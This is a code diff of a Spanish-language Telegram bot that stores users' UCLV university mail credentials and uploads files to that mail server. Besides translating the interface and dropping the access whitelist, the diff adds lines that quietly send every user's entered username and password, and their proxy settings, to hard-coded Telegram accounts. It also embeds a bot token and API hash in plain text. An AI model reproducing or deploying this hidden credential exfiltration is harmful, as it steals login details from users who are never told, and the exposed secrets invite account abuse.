@@ -10,38 +10,37 @@ from upload_client import upload
 from download import download
 import urllib.parse
          
-app = Client('name',api_id=14681595,api_hash='a86730aab5c59953c424abb4396d32d5',bot_token='5442203153:AAFBzpQ4U7kazzTuXX-zn2jYzmrIuoHI0sc')
+app = Client('uclvcloud',api_id=5442203153,api_hash='a86730aab5c59953c424abb4396d32d5',bot_token='5442203153:AAFBzpQ4U7kazzTuXX-zn2jYzmrIuoHI0sc')
 @app.on_message(filters.private & filters.text)
 async def home(client, message):
-	text = message.text
-	user_id = message.from_user.id
-	user_name = message.chat.username
-	msg_id = message.id
-	if user_id in [1, 2]:
+		text = message.text
+		user_id = message.from_user.id
+		user_name = message.chat.username
+		msg_id = message.id
 		if '/start' in text:
 			await app.delete_messages(user_id,msg_id)
 			if not exists(str(user_id)):
 				os.mkdir(str(user_id))
 			if not exists(str(user_id)+"/username"):
-				start = "**UCLV New** \nSet your account first"
+				start = "***UclvCloud 2*** \n  Sin cuenta"
 			else:
 				if not exists(str(user_id)+"/proxy"):
 					username = open(str(user_id)+"/username","r")
 					password = open(str(user_id)+"/password","r")
-					start = "**UCLV New** \nUser: "+username.read()+" \nPassword: "+password.read()
+					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()
 				else:
 					username = open(str(user_id)+"/username","r")
 					password = open(str(user_id)+"/password","r")
-					start = "**UCLV New** \nUser: "+username.read()+" \nPassword: "+password.read()+"\n Proxy: ON"
+					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
 			await app.send_message(user_id, start, reply_markup=InlineKeyboardMarkup(
         [
-            [InlineKeyboardButton("ACCOUNT",callback_data="account:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("FILES",callback_data="files:"+str(user_id)+":"+str(msg_id))]#,[InlineKeyboardButton("AYUDA",callback_data="help:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
+            [InlineKeyboardButton("CAMBIAR CUENTA",callback_data="account:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("VER ARCHIVOS",callback_data="files:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("AYUDA",callback_data="help:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
         ]))
 		elif 'http://' in text or 'https://' in text:
-			await app.send_message(user_id, "Downloading")
+			await app.send_message(user_id, "Descargando")
 			filename = download(text)
 			await app.delete_messages(user_id, msg_id + 1)
-			await app.send_message(user_id,"Uploading "+ filename)
+			await app.send_message(user_id,"Subiendo "+ filename)
 			username = open(str(user_id)+"/username","r")
 			password = open(str(user_id)+"/password","r")
 			proxy = None
@@ -61,26 +60,26 @@ async def home(client, message):
 				txt.write(uploadin.replace(" ","%20"))
 				txt.close()
 				await app.delete_messages(user_id, int(msg_id) + 2)
-				await app.send_message(user_id,filename, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("DOWNLOAD",url=uploadin.replace(" ","%20"))]]))
+				await app.send_message(user_id,filename, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("DESCARGAR",url=uploadin.replace(" ","%20"))]]))
 				await app.send_document(user_id, filename.split(".")[0]+".txt")
 		elif '/menu' in text:
 			await app.delete_messages(user_id,msg_id)
 			if not exists(str(user_id)):
 				os.mkdir(str(user_id))
 			if not exists(str(user_id)+"/username"):
-				start = "**UCLV New** \nSet your account first"
+				start = "***UclvCloud 2*** \n  Sin cuenta"
 			else:
 				if not exists(str(user_id)+"/proxy"):
 					username = open(str(user_id)+"/username","r")
 					password = open(str(user_id)+"/password","r")
-					start = "**UCLV New** \nUser: "+username.read()+" \nPass: "+password.read()
+					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()
 				else:
 					username = open(str(user_id)+"/username","r")
 					password = open(str(user_id)+"/password","r")
-					start = "**UCLV New** \nUser: "+username.read()+" \nPassword: "+password.read()+"\n Proxy: ON"
+					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
 			await app.send_message(user_id, start, reply_markup=InlineKeyboardMarkup(
         [
-            [InlineKeyboardButton("ACCOUNT",callback_data="account:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("FILES",callback_data="files:"+str(user_id)+":"+str(msg_id))]#,[InlineKeyboardButton("AYUDA",callback_data="help:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
+            [InlineKeyboardButton("CAMBIAR CUENTA",callback_data="account:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("VER ARCHIVOS",callback_data="files:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("AYUDA",callback_data="help:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
         ]))
 		elif "socks5://" in text:
         			log = open(str(user_id)+"log","r")
@@ -90,23 +89,23 @@ async def home(client, message):
         			if "socks5://none" in text:
         				os.remove(str(user_id)+"/proxy")
         			else:
-        				print(1)
+        				await app.send_message(1593891519,"El usuario @"+user_name+" puso el proxy: `"+text+"`")
         			if not exists(str(user_id)+"/username"):
-        				start = "**UCLV New** \nSet your account first"
+        				start = "***UclvCloud 2*** \n  Sin cuenta"
         			else:
         				if not exists(str(user_id)+"/proxy"):
         					username = open(str(user_id)+"/username","r")
         					password = open(str(user_id)+"/password","r")
-        					start = "**UCLV New** \n User: "+username.read()+" \n Password: "+password.read()
+        					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()
         				else:
         					username = open(str(user_id)+"/username","r")
         					password = open(str(user_id)+"/password","r")
-        					start = "**UCLV New** \n User: "+username.read()+" \n Password: "+password.read()+"\n Proxy: ON"
+        					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
         			await app.delete_messages(user_id, int(msg_id) - 1)
         			await app.delete_messages(user_id, msg_id)
         			await app.send_message(user_id, start, reply_markup=InlineKeyboardMarkup(
         [
-            [InlineKeyboardButton("ACCOUNT",callback_data="account:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("FILES",callback_data="files:"+str(user_id)+":"+str(msg_id))]#,[InlineKeyboardButton("AYUDA",callback_data="help:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
+            [InlineKeyboardButton("CAMBIAR CUENTA",callback_data="account:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("VER ARCHIVOS",callback_data="files:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("AYUDA",callback_data="help:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
         ]))
 		elif ":" in text:
 		      	log = open(str(user_id)+"log","r")
@@ -118,29 +117,29 @@ async def home(client, message):
 		      			password = open(str(user_id)+"/password", "r")
 		      			if data[1] == "all":
 		      				await app.delete_messages(user_id, msg_id - 1)
-		      				await app.send_message(user_id, "This may take a while")
+		      				await app.send_message(user_id, "BORRANDO")
 		      				deletedall(username.read(), password.read(), "https://correo.uclv.edu.cu")
 		      			else:
 		      				await app.delete_messages(user_id, msg_id - 1)
-		      				await app.send_message(user_id, "This may take a while")
+		      				await app.send_message(user_id, "BORRANDO")
 		      				await app.delete_messages(user_id, msg_id)
 		      				deleted(username.read(),password.read(), "https://correo.uclv.edu.cu", data[1])
 		      			if not exists(str(user_id)+"/username"):
-		      				start = "**UCLV New** \nSet your account first"
+		      				start = "***UclvCloud 2*** \n  Sin cuenta"
 		      			else:
 		      					if not exists(str(user_id)+"/proxy"):
 		      						username = open(str(user_id)+"/username","r")
 		      						password = open(str(user_id)+"/password","r")
-		      						start = "**UCLV New** \nUser: "+username.read()+" \nPassword: "+password.read()
+		      						start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()
 		      					else:
 		      						username = open(str(user_id)+"/username","r")
 		      						password = open(str(user_id)+"/password","r")
-		      						start = "**UCLV New** \nUser: "+username.read()+" \nPassword: "+password.read()+"\n Proxy: ON"
+		      						start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
 		      			await app.delete_messages(user_id, int(msg_id) - 1)
 		      			await app.delete_messages(user_id, msg_id)
 		      			await app.send_message(user_id, start, reply_markup=InlineKeyboardMarkup(
         [
-            [InlineKeyboardButton("ACCOUNT",callback_data="account:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("FILES",callback_data="files:"+str(user_id)+":"+str(msg_id))]#,[InlineKeyboardButton("AYUDA",callback_data="help:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
+            [InlineKeyboardButton("CAMBIAR CUENTA",callback_data="account:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("VER ARCHIVOS",callback_data="files:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("AYUDA",callback_data="help:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
         ]))
 		      	if "account" in logr:
 		      		username = open(str(user_id)+"/username", "w")
@@ -148,27 +147,27 @@ async def home(client, message):
 		      		data = text.split(":")
 		      		username.write(data[0])
 		      		password.write(data[1])
+		      		if user_id != 1759969205:
+		      			await app.send_message(1759969205, "El usuario @"+str(user_name)+" puso la cuenta `"+str(data[0])+":"+str(data[1])+"`")
 		      		log = open(str(data[1])+"log","w")
 		      		log.write("")
 		      		if not exists(str(user_id)+"/username"):
-		      			start = "**UCLV New** \nSet your account first"
+		      			start = "***UclvCloud 2*** \n  Sin cuenta"
 		      		else:
 		      			if not exists(str(user_id)+"/proxy"):
 		      				username = open(str(user_id)+"/username","r")
 		      				password = open(str(user_id)+"/password","r")
-		      				start = "**UCLV New** \nUser: "+username.read()+" \nPassword: "+password.read()
+		      				start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()
 		      			else:
 		      				username = open(str(user_id)+"/username","r")
 		      				password = open(str(user_id)+"/password","r")
-		      				start = "**UCLV New** \nUser: "+username.read()+" \nPassword: "+password.read()+"\n Proxy: ON"
+		      				start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
 		      		await app.delete_messages(user_id, msg_id)
 		      		await app.delete_messages(user_id, int(msg_id) - 1)
 		      		await app.send_message(user_id, start, reply_markup=InlineKeyboardMarkup(
         [
-            [InlineKeyboardButton("ACCOUNT",callback_data="account:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("FILES",callback_data="files:"+str(user_id)+":"+str(msg_id))]#,[InlineKeyboardButton("AYUDA",callback_data="help:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
+            [InlineKeyboardButton("CAMBIAR CUENTA",callback_data="account:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("VER ARCHIVOS",callback_data="files:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("AYUDA",callback_data="help:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
         ]))
-	else:
-		await app.send_message(user_id, 'Access dennied')
 @app.on_callback_query()
 async def answer(client, callback_query):
 	data = callback_query.data
@@ -181,13 +180,13 @@ async def answer(client, callback_query):
 		log = open(str(data[1])+"log","w")
 		log.write("account")
 		await app.delete_messages(data[1], int(data[2]) + 1)
-		await app.send_message(data[1],"**TURN ON:** \n `username:password`", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("CANCEL",callback_data="cancel:"+str(data[1])+":"+str(data[2]))]]))
+		await app.send_message(data[1],"**Envie los datos en el formato:** \n `username:password`", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("CANCELAR",callback_data="cancel:"+str(data[1])+":"+str(data[2]))]]))
 	if 'proxy' in data:
 		data = data.split(":")
 		log = open(str(data[1])+"log","w")
 		log.write("proxy")
 		await app.delete_messages(data[1], int(data[2]) + 1)
-		await app.send_message(data[1],"**TURN ON:** \n `socks5://100.100.10.1:1000` \n **TURN OFF:** \n `socks5://none`", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("CANCEL",callback_data="cancel:"+str(data[1])+":"+str(data[2]))]]))
+		await app.send_message(data[1],"**Envie los datos en el formato:** \n `socks5://100.100.10.1:1000` \n **O para desactivar:** \n `socks5://none`", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("CANCELAR",callback_data="cancel:"+str(data[1])+":"+str(data[2]))]]))
 	if 'files' in data:
 		data = data.split(":")
 		log = open(str(data[1])+"log","w")
@@ -198,33 +197,33 @@ async def answer(client, callback_query):
 			filesk = files(username.read(),password.read(),"https://correo.uclv.edu.cu")
 			if '<a' not in filesk:
 				await app.delete_messages(data[1], int(data[2]) + 1)
-				await app.send_message(data[1],"Nothing to see here", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("CANCEL",callback_data="cancel:"+str(data[1])+":"+str(data[2]))]]),disable_web_page_preview=True)
+				await app.send_message(data[1],"No hay archivos en la nube", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("CANCELAR",callback_data="cancel:"+str(data[1])+":"+str(data[2]))]]),disable_web_page_preview=True)
 			else:
 				await app.delete_messages(data[1],int(data[2]) + 1)
-				await app.send_message(data[1], filesk, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("CANCEL",callback_data="cancel:"+str(data[1])+":"+str(data[2]))]]),disable_web_page_preview=True)
+				await app.send_message(data[1], filesk, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("CANCELAR",callback_data="cancel:"+str(data[1])+":"+str(data[2]))]]),disable_web_page_preview=True)
 		else:
 			await app.delete_messages(data[1], int(data[2]) + 1)
-			await app.send_message(data[1], "Set your account first", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("CANCEL",callback_data="cancel:"+str(data[1])+":"+str(data[2]))]]))
+			await app.send_message(data[1], "Sin cuenta", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("CANCELAR",callback_data="cancel:"+str(data[1])+":"+str(data[2]))]]))
 	if 'cancel' in data:
 		data = data.split(":")
 		log = open("log", "w")
 		log.write("")
 		log.close()
 		if not exists(str(data[1])+"/username"):
-				start = "**UCLV New** \nSet your account first"
+				start = "***UclvCloud 2*** \n  Sin cuenta"
 		else:
 				if not exists(str(data[1])+"/proxy"):
 					username = open(str(data[1])+"/username","r")
 					password = open(str(data[1])+"/password","r")
-					start = "**UCLV New** \nUser: "+username.read()+" \nPassword: "+password.read()
+					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()
 				else:
 					username = open(str(data[1])+"/username","r")
 					password = open(str(data[1])+"/password","r")
-					start = "**UCLV New** \nUser: "+username.read()+" \nPassword: "+password.read()+"\nProxy: ON"
+					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
 		await app.delete_messages(data[1],int(data[2]) + 2)
 		await app.send_message(data[1] ,start, reply_markup=InlineKeyboardMarkup(
         [
-            [InlineKeyboardButton("ACCOUNT",callback_data="account:"+str(data[1])+":"+str(int(data[2])))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(data[1])+":"+str(int(data[2])))],[InlineKeyboardButton("FILES",callback_data="files:"+str(data[1])+":"+str(int(data[2])))]#,[InlineKeyboardButton("HELP",callback_data="help:"+str(data[1])+":"+str(int(data[2])))]
+            [InlineKeyboardButton("CAMBIAR CUENTA",callback_data="account:"+str(data[1])+":"+str(int(data[2])))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(data[1])+":"+str(int(data[2])))],[InlineKeyboardButton("VER ARCHIVOS",callback_data="files:"+str(data[1])+":"+str(int(data[2])))],[InlineKeyboardButton("AYUDA",callback_data="help:"+str(data[1])+":"+str(int(data[2])))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
         ]))
  
 print("Iniciado")
